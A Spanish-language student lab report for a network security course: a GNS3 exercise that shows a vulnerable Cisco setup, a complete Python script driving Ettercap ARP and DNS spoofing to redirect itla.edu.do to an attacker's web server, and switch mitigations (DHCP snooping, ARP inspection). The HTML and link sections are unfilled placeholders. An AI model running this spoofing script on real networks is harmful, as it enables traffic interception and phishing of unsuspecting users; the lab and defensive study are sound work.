# DNS Spoofing / DNS Poisoning

---

## 1. Información General

| Campo | Valor |
|---|---|
| **Nombre** | Miguel Ramirez Meli |
| **Matrícula** | 2025-1367 |
| **Profesor** | Jonathan Rondon |
| **Materia** | Seguridad de Redes |
| **Entorno** | GNS3 |
| **Ataque** | DNS Spoofing / DNS Poisoning |

---

## 2. Objetivo

Redirigir el dominio `itla.edu.do` hacia un servicio web controlado por el atacante mediante ARP Spoofing + DNS Spoofing, aprovechando la ausencia de DHCP Snooping y Dynamic ARP Inspection en el switch de la LAN víctima.

---

## 3. Direccionamiento IP

| Rol | IP | Puerto Switch1 |
|---|---|---|
| Atacante (Kali) | 10.13.67.10/24 | e0/0 |
| Víctima (PC) | 10.13.67.20/24 | e0/1 |
| WEB-1 (legítimo) | 10.13.67.30/24 | e0/2 |
| Router1 (Gateway/DNS) | 10.13.67.1/24 | e0/3 |

---

## 4. Herramientas

`Kali Linux` · `Ettercap` · `Python3 http.server`

---

## 5. Configuración Vulnerable

### Router1 (Gateway + DNS server local)

```
enable
configure terminal
hostname Router1

interface e0/0
 description Enlace hacia Switch1 (LAN VICTIMAS)
 ip address 10.13.67.1 255.255.255.0
 no shutdown
exit

ip dns server
ip host itla.edu.do 10.13.67.30
ip domain lookup

end
write memory
```

### Switch1 (sin protecciones L2)

```
enable
configure terminal
hostname Switch1

vlan 10
 name VICTIMAS
exit

interface e0/0
 description Enlace hacia ATACANTE (Kali)
 switchport mode access
 switchport access vlan 10
 no shutdown
exit

interface e0/1
 description Enlace hacia PC (VICTIMA)
 switchport mode access
 switchport access vlan 10
 no shutdown
exit

interface e0/2
 description Enlace hacia WEB-1
 switchport mode access
 switchport access vlan 10
 no shutdown
exit

interface e0/3
 description Enlace hacia Router1 (Gateway/DNS)
 switchport mode access
 switchport access vlan 10
 no shutdown
exit

end
write memory
```

### WEB-1 (servidor legítimo)

```bash
sudo ip addr add 10.13.67.30/24 dev eth0
sudo ip route add default via 10.13.67.1
cd ~/web_legitimo
sudo python3 -m http.server 80
```

### PC (víctima)

```bash
sudo ip addr add 10.13.67.20/24 dev eth0
sudo ip route add default via 10.13.67.1
echo "nameserver 10.13.67.1" | sudo tee /etc/resolv.conf
```

### Kali (atacante)

```bash
sudo ip addr add 10.13.67.10/24 dev eth0
sudo ip link set eth0 up
sudo ip route add default via 10.13.67.1
```

---

## 6. Script de Ataque (Atacante)

`DNS-Spoofing.py`

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import signal
import shutil
import time
import re

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
CYAN = '\033[0;36m'
NC = '\033[0m'

ETTER_DNS = '/etc/ettercap/etter.dns'
ETTER_DNS_BACKUP = '/tmp/etter.dns.bak'

pids = []
webserver_proc = None

def cleanup(signum=None, frame=None):
    print(f"\n{YELLOW}[*] Deteniendo ataque y limpiando...{NC}")
    for pid in pids:
        try:
            os.kill(pid, signal.SIGTERM)
        except:
            pass

    if os.path.exists(ETTER_DNS_BACKUP):
        try:
            shutil.copy(ETTER_DNS_BACKUP, ETTER_DNS)
            os.remove(ETTER_DNS_BACKUP)
            print(f"{GREEN}[OK] etter.dns restaurado.{NC}")
        except Exception as e:
            print(f"{RED}[ERROR] No se pudo restaurar etter.dns: {e}{NC}")

    print(f"{GREEN}[OK] Limpieza completa.{NC}")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def check_root():
    if os.geteuid() != 0:
        print(f"{RED}[ERROR]{NC} Ejecuta como root (sudo).")
        sys.exit(1)

def check_dependencies():
    required = ['ettercap', 'python3']
    missing = [b for b in required if shutil.which(b) is None]
    if missing:
        print(f"{RED}[ERROR]{NC} Faltan los siguientes binarios: {', '.join(missing)}")
        print(f"{YELLOW}[INFO]{NC} Instala con: sudo apt install ettercap-text-only python3")
        sys.exit(1)
    if not os.path.exists(ETTER_DNS):
        print(f"{RED}[ERROR]{NC} No existe {ETTER_DNS}. Verifica la instalacion de ettercap.")
        sys.exit(1)

def get_interfaces():
    try:
        output = subprocess.check_output(['ip', '-brief', 'link', 'show'], text=True)
        return [l.split()[0] for l in output.strip().split('\n') if l.split() and l.split()[0] != 'lo']
    except:
        return []

def get_ip(iface):
    try:
        output = subprocess.check_output(['ip', '-4', 'addr', 'show', iface], text=True)
        match = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)', output)
        return match.group(1) if match else None
    except:
        return None

def write_etter_dns(domain, attacker_ip):
    shutil.copy(ETTER_DNS, ETTER_DNS_BACKUP)
    print(f"{GREEN}[OK] Backup de etter.dns guardado en {ETTER_DNS_BACKUP}{NC}")

    with open(ETTER_DNS, 'a') as f:
        f.write(f"\n{domain}      A  {attacker_ip}\n")
        f.write(f"*.{domain}    A  {attacker_ip}\n")
    print(f"{GREEN}[OK] Entradas de spoofing agregadas a etter.dns{NC}")

def main():
    global webserver_proc

    check_root()
    check_dependencies()

    print(f"{CYAN}=== DNS Spoofing Attack (Ettercap) ==={NC}")

    webdir = input("Ruta del directorio con el index.html a servir: ").strip()
    if not os.path.isdir(webdir):
        print(f"{RED}[ERROR]{NC} No existe el directorio: {webdir}")
        sys.exit(1)
    if not os.path.isfile(os.path.join(webdir, 'index.html')):
        print(f"{RED}[ERROR]{NC} No existe index.html en {webdir}")
        sys.exit(1)

    target_domain = input("Dominio/URL a spoofear (ej. itla.edu.do): ").strip()
    if not target_domain:
        print(f"{RED}[ERROR]{NC} Debes ingresar un dominio.")
        sys.exit(1)

    ifaces = get_interfaces()
    if ifaces:
        print(f"{YELLOW}Interfaces disponibles:{NC}")
        for i in ifaces:
            print(f" - {i}")
    iface = input("Interfaz de red a usar: ").strip()
    if not iface:
        print(f"{RED}[ERROR]{NC} Debes especificar una interfaz.")
        sys.exit(1)

    attacker_ip = get_ip(iface)
    if not attacker_ip:
        attacker_ip = input(f"No se detecto IP en {iface}, ingresala manualmente: ").strip()

    victim_ip = input("IP de la victima: ").strip()
    if not victim_ip:
        print(f"{RED}[ERROR]{NC} Debes ingresar IP de victima.")
        sys.exit(1)

    gateway_ip = input("IP del gateway/DNS legitimo: ").strip()
    if not gateway_ip:
        print(f"{RED}[ERROR]{NC} Debes ingresar IP de gateway.")
        sys.exit(1)

    print("")
    print(f"{CYAN}--------------- RESUMEN ---------------{NC}")
    print(f"Web dir      : {GREEN}{webdir}{NC}")
    print(f"Dominio      : {GREEN}{target_domain}{NC} -> {GREEN}{attacker_ip}{NC}")
    print(f"Interfaz     : {GREEN}{iface}{NC}")
    print(f"IP atacante  : {GREEN}{attacker_ip}{NC}")
    print(f"Victima      : {GREEN}{victim_ip}{NC}")
    print(f"Gateway      : {GREEN}{gateway_ip}{NC}")
    print(f"{CYAN}----------------------------------------{NC}")

    confirm = input("Quieres iniciar el ataque? (s/n): ").strip().lower()
    if confirm != 's':
        print("Cancelado.")
        sys.exit(0)

    write_etter_dns(target_domain, attacker_ip)

    print(f"{YELLOW}[*] Levantando servidor web falso en {webdir} (puerto 80)...{NC}")
    webserver_proc = subprocess.Popen(
        ['python3', '-m', 'http.server', '80'],
        cwd=webdir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    pids.append(webserver_proc.pid)
    time.sleep(1)

    print(f"{YELLOW}[*] Lanzando Ettercap (ARP + DNS spoof)...{NC}")
    print(f"{CYAN}--------------- LOG DE ETTERCAP ---------------{NC}")

    cmd = [
        'ettercap', '-T', '-q', '-i', iface,
        '-P', 'dns_spoof',
        '-M', 'arp:remote',
        f"//{victim_ip}/", f"//{gateway_ip}/"
    ]

    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        pass

    cleanup()

if __name__ == '__main__':
    main()
```

**Ejecución:**

```bash
sudo python3 DNS-Spoofing.py
```

**Repositorio GitHub del script:**

[PEGAR LINK DEL SCRIPT EN GITHUB]

---

## 7. Página Web Legítima (WEB-1)

`index.html`

```html
[PEGAR AQUI EL CODIGO DEL index.html LEGITIMO]
```

---

## 8. Página Web Falsa (Atacante)

`index.html`

```html
[PEGAR AQUI EL CODIGO DEL index.html DEL ATACANTE]
```

---

## 9. Verificación (Víctima)

```bash
nslookup itla.edu.do
arp -n
```

---

## 10. Mitigación (Switch1)

```cisco
enable
configure terminal

ip dhcp snooping
ip dhcp snooping vlan 10
ip arp inspection vlan 10
no ip dhcp snooping information option

interface e0/3
 ip dhcp snooping trust
 ip arp inspection trust
 exit

interface e0/2
 ip dhcp snooping trust
 ip arp inspection trust
 exit

interface e0/0
 ip dhcp snooping limit rate 100
 ip arp inspection limit rate 100
 switchport port-security
 switchport port-security maximum 3
 switchport port-security violation restrict
 exit

interface e0/1
 ip dhcp snooping limit rate 100
 ip arp inspection limit rate 100
 exit

end
write memory
```

---

## 11. Reintento del Ataque (post-mitigación)

```bash
sudo python3 DNS-Spoofing.py
```

---

## 12. Verificación Final (Víctima)

```bash
nslookup itla.edu.do
arp -n
```
